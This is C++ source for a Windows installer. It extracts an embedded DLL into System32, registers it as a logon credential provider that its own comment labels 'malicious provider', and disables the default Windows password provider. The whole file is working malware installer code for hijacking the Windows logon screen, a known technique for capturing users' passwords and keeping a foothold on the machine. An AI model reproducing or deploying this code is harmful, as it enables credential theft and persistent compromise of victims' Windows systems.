// installer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
//#include "String"
#include "resource.h"
#include <windows.h>
#include <fstream>
#include<iostream>
#pragma comment(lib, "Advapi32.lib") //needed to link for reg functions

void extractWriteDLL(int rsrc, char* str) {
	HMODULE handle = GetModuleHandle(NULL);
	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(rsrc), MAKEINTRESOURCE(dll));
	HGLOBAL rcdata = LoadResource(handle, rc);
	DWORD size = SizeofResource(handle, rc);
	void *dataP = LockResource(rcdata);
	
	//data loaded and dataP points to start of executable
	//now need to write the data to the location of str
	std::ofstream f(str, std::ios::out | std::ios::binary);
	f.write((char*)dataP, size);
	f.close();
	return;
}
void writeToReg(HKEY root, wchar_t* location, LPCWSTR name, LPCWSTR data) {
	HKEY hkey;
	RegCreateKeyEx(root, location,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hkey,NULL);
	RegSetValueEx(hkey, name, 0, REG_SZ, (LPBYTE)data, 2 * (wcslen(data) + 1));
}
void writeDwordReg(HKEY root, wchar_t* location, LPCWSTR name, DWORD data) {
	HKEY hkey;
	RegCreateKeyEx(root, location, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
	RegSetValueEx(hkey, name, 0, REG_DWORD, (LPBYTE)&data, sizeof(DWORD));
}
int main()
{
	extractWriteDLL(IDR_2691, "C:\\Windows\\System32\\credprov32.dll");
	//Setup malicious provider
	writeToReg(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{82e8c0d2-24a5-416d-9fb0-a629deb962fd}", NULL, L"credprov32");
	writeToReg(HKEY_CLASSES_ROOT, L"CLSID\\{82e8c0d2-24a5-416d-9fb0-a629deb962fd}", NULL, L"credprov32");
	writeToReg(HKEY_CLASSES_ROOT, L"CLSID\\{82e8c0d2-24a5-416d-9fb0-a629deb962fd}\\InprocServer32", NULL, L"credprov32.dll");
	writeToReg(HKEY_CLASSES_ROOT, L"CLSID\\{82e8c0d2-24a5-416d-9fb0-a629deb962fd}\\InprocServer32", L"ThreadingModel", L"Apartment");

	//Disable the default provider
	writeDwordReg(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers\\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}", L"Disabled", (DWORD)1);
    return 0;
}

